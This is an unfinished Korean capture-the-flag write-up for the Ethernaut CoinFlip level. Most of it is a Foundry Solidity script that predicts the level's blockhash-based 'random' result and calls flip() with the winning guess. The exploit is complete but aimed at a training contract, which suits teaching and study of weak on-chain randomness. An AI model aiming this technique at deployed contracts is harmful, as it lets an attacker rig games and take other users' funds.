---
tags:
  - Ethernaut
  - Write-up
---
Random인 척 하는 값을 이용한다고도 볼 수 있고.. Random을 구현하기 힘듦을 나타내는 것이라고도 할 수 있고.. 아무튼 그런 문제입니다.

![[Pasted image 20241004045902.png]]

초 심플한 문제입니다. `flip()` 함수 하나만 있는데, 플레이어가 할 일은 `_guess` 값을 제대로 넣는 것 밖에 없습니다.
솔직히 script 짜기 귀찮지만, 연습삼아 해보기로 했습니다.

아래 문서 등을 참고하며 짰습니다.
- [Foundry, getBlockNumber](https://book.getfoundry.sh/cheatcodes/get-block-number)


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/EN_3_CoinFlip.sol";

contract Player {
  uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor (CoinFlip prob) {
    uint blockValue = uint(blockhash(block.number - 1));
    uint coinflip = blockValue / FACTOR;
    bool guess = coinflip == 1 ? true : false;
    prob.flip(guess);
  }
}

contract EN_3 is Script {
    CoinFlip public ctrt = CoinFlip(payable(0x94099942864EA81cCF197E9D71ac53310b1468D8));


    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        new Player(ctrt);
        console.log("Win count:", ctrt.consecutiveWins());

        vm.stopBroadcast();
    }
}
```

(wip)